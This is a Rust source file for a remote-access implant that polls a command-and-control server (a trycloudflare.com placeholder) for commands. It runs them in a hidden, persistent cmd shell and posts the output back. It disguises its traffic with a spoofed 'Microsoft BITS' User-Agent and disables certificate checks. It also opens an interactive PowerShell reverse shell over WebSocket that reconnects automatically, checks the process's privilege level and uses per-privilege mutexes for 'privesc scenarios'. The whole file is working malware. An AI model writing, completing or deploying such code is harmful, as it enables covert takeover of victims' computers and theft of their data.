use rand::Rng;
use std::process::{Command, Stdio, Child, ChildStdin, ChildStdout};
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::thread;
use std::time::Duration;
use std::io::{Write, BufRead, BufReader};
use serde::{Deserialize, Serialize};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const C2_URL: &str = "https://CHANGE-ME.trycloudflare.com";
const API_KEY: &str = "00000000000000000000000000000000";
const PAYLOAD_TOKEN: &str = "00000000000000000000000000000000";

static PTY_RUNNING: AtomicBool = AtomicBool::new(false);
static PTY_SESSION_ID: AtomicU64 = AtomicU64::new(0);

// Get Windows integrity level (LOW, MEDIUM, HIGH, SYSTEM)
#[cfg(target_os = "windows")]
fn get_integrity_level() -> &'static str {
    use std::process::Command;
    
    // Quick check via whoami - returns integrity level
    if let Ok(output) = Command::new("cmd")
        .args(&["/C", "whoami /groups | findstr /I \"High Mandatory\""])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        let out = String::from_utf8_lossy(&output.stdout);
        if out.contains("High Mandatory") {
            return "HIGH";
        }
    }
    
    if let Ok(output) = Command::new("cmd")
        .args(&["/C", "whoami /groups | findstr /I \"System Mandatory\""])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        let out = String::from_utf8_lossy(&output.stdout);
        if out.contains("System Mandatory") {
            return "SYSTEM";
        }
    }
    
    "MEDIUM" // Default - Medium or Low integrity
}

#[cfg(not(target_os = "windows"))]
fn get_integrity_level() -> &'static str {
    if std::env::var("USER").unwrap_or_default() == "root" {
        "ROOT"
    } else {
        "USER"
    }
}

// Persistent shell for BITS commands - maintains same session
struct PersistentShell {
    process: Option<Child>,
    stdin: Option<ChildStdin>,
    stdout_reader: Option<BufReader<ChildStdout>>,
}

impl PersistentShell {
    fn new() -> Self {
        PersistentShell {
            process: None,
            stdin: None,
            stdout_reader: None,
        }
    }

    fn is_alive(&mut self) -> bool {
        if let Some(ref mut proc) = self.process {
            match proc.try_wait() {
                Ok(None) => true,
                _ => {
                    self.process = None;
                    self.stdin = None;
                    self.stdout_reader = None;
                    false
                }
            }
        } else {
            false
        }
    }

    fn spawn(&mut self) -> Result<(), String> {
        // Kill old process if exists
        if let Some(ref mut proc) = self.process {
            let _ = proc.kill();
        }
        
        #[cfg(target_os = "windows")]
        let mut cmd = {
            let mut c = Command::new("cmd.exe");
            c.args(&["/Q", "/K", "prompt $P$G"]);
            c.creation_flags(CREATE_NO_WINDOW);
            c
        };

        #[cfg(not(target_os = "windows"))]
        let mut cmd = {
            let mut c = Command::new("sh");
            c
        };

        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        let mut child = cmd.spawn().map_err(|e| format!("Spawn failed: {}", e))?;
        
        let stdin = child.stdin.take().ok_or("No stdin")?;
        let stdout = child.stdout.take().ok_or("No stdout")?;
        
        self.process = Some(child);
        self.stdin = Some(stdin);
        self.stdout_reader = Some(BufReader::new(stdout));
        
        // Small delay for shell to initialize
        thread::sleep(Duration::from_millis(100));
        
        Ok(())
    }

    fn ensure_running(&mut self) -> Result<(), String> {
        if !self.is_alive() {
            self.spawn()?;
        }
        Ok(())
    }

    fn execute(&mut self, cmd_str: &str) -> String {
        // Try twice - if shell dies, respawn and retry
        for attempt in 0..2 {
            if let Err(e) = self.ensure_running() {
                return format!("Shell error: {}", e);
            }

            let marker = format!("__END_{}__", rand::random::<u32>());
            
            // Write command + echo marker
            let write_ok = if let Some(ref mut stdin) = self.stdin {
                let full_cmd = format!("{}\r\necho {}\r\n", cmd_str.trim(), marker);
                stdin.write_all(full_cmd.as_bytes()).is_ok() && stdin.flush().is_ok()
            } else {
                false
            };

            if !write_ok {
                self.process = None;
                self.stdin = None;
                self.stdout_reader = None;
                if attempt == 0 { continue; } // Retry with fresh shell
                return "Write failed".to_string();
            }

            // Read until marker
            let mut output = String::new();
            let start = std::time::Instant::now();
            let timeout = Duration::from_secs(30);
            let mut shell_died = false;

            if let Some(ref mut reader) = self.stdout_reader {
                loop {
                    if start.elapsed() > timeout {
                        output.push_str("\n[Timeout]");
                        break;
                    }

                    let mut line = String::new();
                    match reader.read_line(&mut line) {
                        Ok(0) => {
                            shell_died = true;
                            break;
                        }
                        Ok(_) => {
                            if line.contains(&marker) {
                                break;
                            }
                            // Skip empty prompt lines and the command echo
                            if !line.trim().is_empty() && !line.contains(&cmd_str.trim().chars().take(20).collect::<String>()) {
                                output.push_str(&line);
                            }
                        }
                        Err(_) => {
                            shell_died = true;
                            break;
                        }
                    }
                }
            }

            if shell_died {
                self.process = None;
                self.stdin = None;
                self.stdout_reader = None;
                if attempt == 0 { continue; } // Retry with fresh shell
                return "[Shell died, respawning...]".to_string();
            }

            return output.trim().to_string();
        }
        "Failed after retry".to_string()
    }
}

#[derive(Deserialize)]
struct CmdResponse { command: Option<String> }

#[derive(Deserialize)]
struct PtyStatus { pty_requested: bool }

#[derive(Serialize)]
struct ResultPayload { result: String }

#[cfg(target_os = "windows")]
mod conpty {
    use std::ptr;
    use std::mem;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::processthreadsapi::*;
    use winapi::um::handleapi::*;
    use winapi::um::namedpipeapi::*;
    use winapi::um::winbase::*;
    use winapi::um::synchapi::*;
    use winapi::um::fileapi::{ReadFile, WriteFile};
    use winapi::um::errhandlingapi::*;
    use winapi::shared::minwindef::*;
    use winapi::shared::ntdef::*;
    use winapi::ctypes::c_void;

    #[link(name = "kernel32")]
    extern "system" {
        fn CreatePseudoConsole(
            size: COORD,
            hInput: HANDLE,
            hOutput: HANDLE,
            dwFlags: DWORD,
            phPC: *mut HPCON,
        ) -> HRESULT;
        fn ClosePseudoConsole(hPC: HPCON);
        fn ResizePseudoConsole(hPC: HPCON, size: COORD) -> HRESULT;
    }

    #[repr(C)]
    #[derive(Copy, Clone)]
    pub struct COORD {
        pub X: i16,
        pub Y: i16,
    }

    pub type HPCON = *mut c_void;
    pub type HRESULT = i32;

    pub struct ConPty {
        pub hpc: HPCON,
        pub pipe_in: HANDLE,
        pub pipe_out: HANDLE,
        pub process: HANDLE,
        pub thread: HANDLE,
    }

    unsafe impl Send for ConPty {}
    unsafe impl Sync for ConPty {}

    impl ConPty {
        pub fn new(cols: i16, rows: i16) -> Result<Self, String> {
            unsafe {
                let mut pipe_pty_in: HANDLE = ptr::null_mut();
                let mut pipe_pty_out: HANDLE = ptr::null_mut();
                let mut pipe_in: HANDLE = ptr::null_mut();
                let mut pipe_out: HANDLE = ptr::null_mut();

                if CreatePipe(&mut pipe_pty_in, &mut pipe_in, ptr::null_mut(), 0) == 0 {
                    return Err(format!("CreatePipe in failed: {}", GetLastError()));
                }
                if CreatePipe(&mut pipe_out, &mut pipe_pty_out, ptr::null_mut(), 0) == 0 {
                    CloseHandle(pipe_pty_in);
                    CloseHandle(pipe_in);
                    return Err(format!("CreatePipe out failed: {}", GetLastError()));
                }

                let size = COORD { X: cols, Y: rows };
                let mut hpc: HPCON = ptr::null_mut();
                let hr = CreatePseudoConsole(size, pipe_pty_in, pipe_pty_out, 0, &mut hpc);
                if hr != 0 {
                    CloseHandle(pipe_pty_in);
                    CloseHandle(pipe_pty_out);
                    CloseHandle(pipe_in);
                    CloseHandle(pipe_out);
                    return Err(format!("CreatePseudoConsole failed: 0x{:x}", hr));
                }

                CloseHandle(pipe_pty_in);
                CloseHandle(pipe_pty_out);

                let mut si_ex: STARTUPINFOEXW = mem::zeroed();
                si_ex.StartupInfo.cb = mem::size_of::<STARTUPINFOEXW>() as u32;

                let mut attr_size: usize = 0;
                InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_size);
                
                let attr_list = vec![0u8; attr_size];
                si_ex.lpAttributeList = attr_list.as_ptr() as *mut _;
                
                if InitializeProcThreadAttributeList(si_ex.lpAttributeList, 1, 0, &mut attr_size) == 0 {
                    ClosePseudoConsole(hpc);
                    CloseHandle(pipe_in);
                    CloseHandle(pipe_out);
                    return Err("InitializeProcThreadAttributeList failed".to_string());
                }

                const PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE: usize = 0x00020016;
                if UpdateProcThreadAttribute(
                    si_ex.lpAttributeList,
                    0,
                    PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                    hpc as *mut _,
                    mem::size_of::<HPCON>(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                ) == 0 {
                    DeleteProcThreadAttributeList(si_ex.lpAttributeList);
                    ClosePseudoConsole(hpc);
                    CloseHandle(pipe_in);
                    CloseHandle(pipe_out);
                    return Err("UpdateProcThreadAttribute failed".to_string());
                }

                let cmd: Vec<u16> = OsStr::new("powershell.exe -NoLogo -NoProfile")
                    .encode_wide()
                    .chain(std::iter::once(0))
                    .collect();

                let mut pi: PROCESS_INFORMATION = mem::zeroed();
                let result = CreateProcessW(
                    ptr::null(),
                    cmd.as_ptr() as *mut _,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    0,
                    EXTENDED_STARTUPINFO_PRESENT,
                    ptr::null_mut(),
                    ptr::null(),
                    &mut si_ex.StartupInfo,
                    &mut pi,
                );

                DeleteProcThreadAttributeList(si_ex.lpAttributeList);

                if result == 0 {
                    ClosePseudoConsole(hpc);
                    CloseHandle(pipe_in);
                    CloseHandle(pipe_out);
                    return Err(format!("CreateProcessW failed: {}", GetLastError()));
                }

                Ok(ConPty {
                    hpc,
                    pipe_in,
                    pipe_out,
                    process: pi.hProcess,
                    thread: pi.hThread,
                })
            }
        }

        pub fn read(&self, buf: &mut [u8]) -> Result<usize, String> {
            unsafe {
                let mut bytes_read: DWORD = 0;
                let mut available: DWORD = 0;
                
                if PeekNamedPipe(self.pipe_out, ptr::null_mut(), 0, ptr::null_mut(), &mut available, ptr::null_mut()) == 0 {
                    return Err("PeekNamedPipe failed".to_string());
                }
                
                if available == 0 {
                    return Ok(0);
                }

                let to_read = std::cmp::min(buf.len() as u32, available);
                if ReadFile(self.pipe_out, buf.as_mut_ptr() as *mut _, to_read, &mut bytes_read, ptr::null_mut()) == 0 {
                    let err = GetLastError();
                    if err == 109 {
                        return Err("Pipe closed".to_string());
                    }
                    return Err(format!("ReadFile failed: {}", err));
                }
                Ok(bytes_read as usize)
            }
        }

        pub fn write(&self, data: &[u8]) -> Result<usize, String> {
            unsafe {
                let mut bytes_written: DWORD = 0;
                if WriteFile(self.pipe_in, data.as_ptr() as *const _, data.len() as u32, &mut bytes_written, ptr::null_mut()) == 0 {
                    return Err(format!("WriteFile failed: {}", GetLastError()));
                }
                Ok(bytes_written as usize)
            }
        }

        pub fn is_alive(&self) -> bool {
            unsafe {
                WaitForSingleObject(self.process, 0) == WAIT_TIMEOUT
            }
        }

        pub fn resize(&self, cols: i16, rows: i16) -> Result<(), String> {
            unsafe {
                let size = COORD { X: cols, Y: rows };
                let hr = ResizePseudoConsole(self.hpc, size);
                if hr != 0 {
                    return Err(format!("ResizePseudoConsole failed: 0x{:x}", hr));
                }
                Ok(())
            }
        }
    }

    impl Drop for ConPty {
        fn drop(&mut self) {
            unsafe {
                ClosePseudoConsole(self.hpc);
                CloseHandle(self.pipe_in);
                CloseHandle(self.pipe_out);
                CloseHandle(self.process);
                CloseHandle(self.thread);
            }
        }
    }

    const WAIT_TIMEOUT: u32 = 258;
}

// PTY session with auto-reconnect
fn run_pty_websocket(c2_url: &str, agent_id: &str, my_session_id: u64) {
    use tokio::runtime::Runtime;
    use tokio::sync::mpsc;
    use tokio_tungstenite::connect_async;
    use futures_util::{StreamExt, SinkExt};
    use tokio_tungstenite::tungstenite::Message;

    let rt = match Runtime::new() {
        Ok(r) => r,
        Err(_) => return,
    };

    let c2_url_owned = c2_url.to_string();
    let agent_id_owned = agent_id.to_string();

    rt.block_on(async {
        let mut reconnect_count = 0;
        const MAX_RECONNECTS: u32 = 50; // Max reconnection attempts
        
        loop {
            // Check if session is still valid
            if PTY_SESSION_ID.load(Ordering::SeqCst) != my_session_id {
                break;
            }
            
            // Check reconnect limit
            if reconnect_count >= MAX_RECONNECTS {
                break;
            }

            let ws_url = format!("{}/tty/{}",
                c2_url_owned.replace("https://", "wss://").replace("http://", "ws://"),
                agent_id_owned);

            let (ws_stream, _) = match connect_async(&ws_url).await {
                Ok(s) => {
                    reconnect_count = 0; // Reset on successful connect
                    s
                },
                Err(_) => {
                    reconnect_count += 1;
                    tokio::time::sleep(Duration::from_secs(3)).await;
                    continue; // Retry connection
                }
            };

            let (mut ws_write, mut ws_read) = ws_stream.split();

            if ws_write.send(Message::Text(r#"{"role":"agent"}"#.to_string())).await.is_err() {
                tokio::time::sleep(Duration::from_secs(3)).await;
                continue;
            }

            #[cfg(not(target_os = "windows"))]
            {
                let _ = ws_write.send(Message::Text("PTY not supported\r\n".to_string())).await;
                break;
            }

            #[cfg(target_os = "windows")]
            {
                let hostname = std::env::var("COMPUTERNAME")
                    .or_else(|_| std::env::var("HOSTNAME"))
                    .unwrap_or_else(|_| "host".to_string());

                // Create ConPTY - will auto-recreate if process dies
                let mut pty_opt: Option<conpty::ConPty> = match conpty::ConPty::new(120, 30) {
                    Ok(p) => Some(p),
                    Err(e) => {
                        let _ = ws_write.send(Message::Text(format!("ConPTY error: {}\r\n", e))).await;
                        tokio::time::sleep(Duration::from_secs(3)).await;
                        continue;
                    }
                };

                let _ = ws_write.send(Message::Text(format!("=== ConPTY {} ===\r\n", hostname))).await;

                let (output_tx, mut output_rx) = mpsc::channel::<Vec<u8>>(100);
                let pty_dead = Arc::new(AtomicBool::new(false));
                let pty_dead_clone = pty_dead.clone();

                // Take PTY for reader thread
                if let Some(pty) = pty_opt.take() {
                    let pty = Arc::new(pty);
                    let pty_reader = pty.clone();
                    
                    std::thread::spawn(move || {
                        let mut buf = [0u8; 4096];
                        loop {
                            match pty_reader.read(&mut buf) {
                                Ok(0) => {
                                    std::thread::sleep(Duration::from_millis(10));
                                    if !pty_reader.is_alive() {
                                        pty_dead_clone.store(true, Ordering::SeqCst);
                                        break;
                                    }
                                }
                                Ok(n) => {
                                    let _ = output_tx.blocking_send(buf[..n].to_vec());
                                }
                                Err(_) => {
                                    pty_dead_clone.store(true, Ordering::SeqCst);
                                    break;
                                }
                            }
                        }
                    });

                    // Main loop - handle I/O
                    loop {
                        if PTY_SESSION_ID.load(Ordering::SeqCst) != my_session_id {
                            break;
                        }

                        // Check if PTY died - notify and break to reconnect
                        if pty_dead.load(Ordering::SeqCst) {
                            let _ = ws_write.send(Message::Text("\r\n\x1b[33m[PTY died - reconnecting...]\x1b[0m\r\n".to_string())).await;
                            break; // Break inner loop to reconnect PTY
                        }

                        tokio::select! {
                            msg = ws_read.next() => {
                                match msg {
                                    Some(Ok(Message::Text(input))) => {
                                        if input == "ping" { continue; }
                                        // Check for resize command: {"resize":[cols,rows]}
                                        if input.starts_with("{\"resize\":") {
                                            if let Ok(v) = serde_json::from_str::<serde_json::Value>(&input) {
                                                if let Some(arr) = v.get("resize").and_then(|r| r.as_array()) {
                                                    if arr.len() == 2 {
                                                        let cols = arr[0].as_i64().unwrap_or(120) as i16;
                                                        let rows = arr[1].as_i64().unwrap_or(30) as i16;
                                                        let _ = pty.resize(cols, rows);
                                                    }
                                                }
                                            }
                                            continue;
                                        }
                                        let _ = pty.write(input.as_bytes());
                                    }
                                    Some(Ok(Message::Binary(data))) => {
                                        let _ = pty.write(&data);
                                    }
                                    // WebSocket closed/error - exit completely
                                    Some(Ok(Message::Close(_))) => return,
                                    Some(Err(_)) => return,
                                    None => return,
                                    _ => {}
                                }
                            }
                            output = output_rx.recv() => {
                                if let Some(data) = output {
                                    let text = String::from_utf8_lossy(&data).to_string();
                                    if ws_write.send(Message::Text(text)).await.is_err() {
                                        return; // Send failed - exit completely
                                    }
                                }
                            }
                            _ = tokio::time::sleep(Duration::from_millis(50)) => {}
                        }
                    }
                }
            }
            
            // WebSocket disconnected - wait and retry connection
            // This keeps the PTY session alive through network interruptions
            std::thread::sleep(Duration::from_secs(3));
            continue; // Retry WebSocket connection
        }
    });
}

fn start_pty_session(ws_url: String, agent_id: String) {
    if PTY_RUNNING.compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst).is_err() {
        return;
    }
    let session_id = PTY_SESSION_ID.fetch_add(1, Ordering::SeqCst) + 1;
    thread::spawn(move || {
        run_pty_websocket(&ws_url, &agent_id, session_id);
        PTY_RUNNING.store(false, Ordering::SeqCst);
    });
}

pub fn run_agent() {
    // Single-instance check per integrity level
    // Allows: 1 LOW + 1 HIGH (for privesc scenarios)
    // Prevents: duplicate agents at same privilege level
    #[cfg(target_os = "windows")]
    {
        use std::ptr::null_mut;
        
        // Get current integrity level for mutex name
        let integrity = get_integrity_level();
        let mutex_name: Vec<u16> = format!("Global\\Agent_{}_{}\\0", PAYLOAD_TOKEN.chars().take(8).collect::<String>(), integrity)
            .encode_utf16()
            .collect();
        
        extern "system" {
            fn CreateMutexW(lpMutexAttributes: *mut std::ffi::c_void, bInitialOwner: i32, lpName: *const u16) -> *mut std::ffi::c_void;
            fn GetLastError() -> u32;
        }
        
        const ERROR_ALREADY_EXISTS: u32 = 183;
        
        unsafe {
            let handle = CreateMutexW(null_mut(), 0, mutex_name.as_ptr());
            if !handle.is_null() && GetLastError() == ERROR_ALREADY_EXISTS {
                // Agent already running at this integrity level, exit silently
                return;
            }
            // Keep mutex handle alive (don't close it) - will release on process exit
        }
    }

    let c2_url = C2_URL.trim();
    let token = PAYLOAD_TOKEN;
    let api_key = API_KEY;

    let hostname = std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".to_string());
    let _username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "user".to_string());
    
    let mut rng = rand::thread_rng();
    let random_num: u16 = rng.gen_range(1..=999);
    
    let agent_id = format!("{}-{:04x}", hostname, random_num);
    let cmd_url = format!("{}/bits/cmd/{}?key={}", c2_url, agent_id, token);
    let result_url = format!("{}/bits/result/{}?key={}", c2_url, agent_id, token);
    let pty_status_url = format!("{}/bits/pty-status/{}", c2_url, agent_id);

    let client = match reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(60))
        .build()
    {
        Ok(c) => c,
        Err(_) => return,
    };

    // Persistent CMD shell for BITS commands - same session throughout
    let shell = Arc::new(Mutex::new(PersistentShell::new()));

    loop {
        // Check for PTY request
        if let Ok(resp) = client.get(&pty_status_url).header("X-API-Key", api_key).send() {
            if let Ok(status) = resp.json::<PtyStatus>() {
                if status.pty_requested {
                    start_pty_session(c2_url.to_string(), agent_id.clone());
                }
            }
        }

        // Check for BITS commands
        if let Ok(resp) = client.get(&cmd_url)
            .header("X-API-Key", api_key)
            .header("User-Agent", "Microsoft BITS/7.8")
            .send()
        {
            if resp.status().is_success() {
                if let Ok(text) = resp.text() {
                    let cmd = serde_json::from_str::<CmdResponse>(&text)
                        .ok()
                        .and_then(|r| r.command)
                        .unwrap_or_else(|| text.trim().to_string());

                    if !cmd.is_empty() {
                        // Use persistent shell - same session for all commands
                        let result = {
                            let mut sh = shell.lock().unwrap();
                            sh.execute(&cmd)
                        };
                        
                        let _ = client.post(&result_url)
                            .header("X-API-Key", api_key)
                            .header("Content-Type", "application/json")
                            .header("User-Agent", "Microsoft BITS/7.8")
                            .json(&ResultPayload { result })
                            .send();
                    }
                }
            }
        }
        thread::sleep(Duration::from_secs(5));
    }
}
